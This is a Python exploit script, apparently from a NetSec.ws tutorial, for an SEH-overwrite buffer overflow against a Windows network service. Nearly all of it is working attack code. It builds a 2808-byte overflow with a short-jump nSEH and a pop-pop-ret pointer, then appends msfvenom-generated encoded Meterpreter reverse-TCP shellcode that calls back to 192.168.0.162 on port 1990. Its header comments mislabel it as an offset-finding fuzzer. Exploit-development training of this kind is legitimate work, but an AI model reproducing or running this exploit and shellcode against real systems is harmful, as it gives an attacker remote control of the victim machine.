# Determining EIP Offset
# Written for NetSec.ws
# use pattern_create to gen unique pattern: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 1075
 
import sys, socket, time
 
# Use in the form "python fuzzer.py  "
 
host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user

pattern = "A" * 2808
nseh = "\xeb\x06\x90\x90"  # jump 6 bytes
seh = "\x26\x14\x40\x00"   # pointer to pop pop ret 00401426
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.162 LPORT=1990 -f python -b '"\x00\x0a\x0d'
# No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# No Arch selected, selecting Arch: x86 from the payload
# Found 10 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 360 (iteration=0)
# x86/shikata_ga_nai chosen with final size 360
# Payload size: 360 bytes
# Final size of python file: 1730 bytes
buf =  ""
buf += "\xbd\xb6\xb3\x2c\xc1\xdb\xdd\xd9\x74\x24\xf4\x58\x2b"
buf += "\xc9\xb1\x54\x83\xe8\xfc\x31\x68\x0f\x03\x68\xb9\x51"
buf += "\xd9\x3d\x2d\x17\x22\xbe\xad\x78\xaa\x5b\x9c\xb8\xc8"
buf += "\x28\x8e\x08\x9a\x7d\x22\xe2\xce\x95\xb1\x86\xc6\x9a"
buf += "\x72\x2c\x31\x94\x83\x1d\x01\xb7\x07\x5c\x56\x17\x36"
buf += "\xaf\xab\x56\x7f\xd2\x46\x0a\x28\x98\xf5\xbb\x5d\xd4"
buf += "\xc5\x30\x2d\xf8\x4d\xa4\xe5\xfb\x7c\x7b\x7e\xa2\x5e"
buf += "\x7d\x53\xde\xd6\x65\xb0\xdb\xa1\x1e\x02\x97\x33\xf7"
buf += "\x5b\x58\x9f\x36\x54\xab\xe1\x7f\x52\x54\x94\x89\xa1"
buf += "\xe9\xaf\x4d\xd8\x35\x25\x56\x7a\xbd\x9d\xb2\x7b\x12"
buf += "\x7b\x30\x77\xdf\x0f\x1e\x9b\xde\xdc\x14\xa7\x6b\xe3"
buf += "\xfa\x2e\x2f\xc0\xde\x6b\xeb\x69\x46\xd1\x5a\x95\x98"
buf += "\xba\x03\x33\xd2\x56\x57\x4e\xb9\x3e\x94\x63\x42\xbe"
buf += "\xb2\xf4\x31\x8c\x1d\xaf\xdd\xbc\xd6\x69\x19\xc3\xcc"
buf += "\xce\xb5\x3a\xef\x2e\x9f\xf8\xbb\x7e\xb7\x29\xc4\x14"
buf += "\x47\xd6\x11\x80\x4d\x40\x5a\xfd\x52\x32\x32\xfc\x52"
buf += "\x35\x05\x89\xb5\x69\xd9\xda\x69\xc9\x89\x9a\xd9\xa1"
buf += "\xc3\x14\x05\xd1\xeb\xfe\x2e\x7b\x04\x57\x06\x13\xbd"
buf += "\xf2\xdc\x82\x42\x29\x99\x84\xc9\xd8\x5d\x4a\x3a\xa8"
buf += "\x4d\xba\x5b\x52\x8e\x3a\xf6\x52\xe4\x3e\x50\x04\x90"
buf += "\x3c\x85\x62\x3f\xbf\xe0\xf0\x38\x3f\x75\xc1\x33\x09"
buf += "\xe3\x6d\x2c\x75\xe3\x6d\xac\x23\x69\x6e\xc4\x93\xc9"
buf += "\x3d\xf1\xdc\xc7\x51\xaa\x48\xe8\x03\x1e\xdb\x80\xa9"
buf += "\x79\x2b\x0f\x51\xac\x28\x48\xad\x32\x0c\xf1\xc6\xcc"
buf += "\x10\x01\x17\xa7\x90\x51\x7f\x3c\xbf\x5e\x4f\xbd\x6a"
buf += "\x37\xc7\x34\xfa\xf5\x76\x48\xd7\x58\x27\x49\xdb\x40"
buf += "\x3e\xc4\x1c\x77\x3f\x26\x21\xa1\x06\x5c\x62\x71\x3d"
buf += "\x6f\xd9\xd4\x14\xfa\x21\x4a\x66\x2f";

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
client.connect((host, port)) # Connect to user supplied port and IP address
client.send(pattern+nseh+seh+buf)
client.close() # Close the Connection
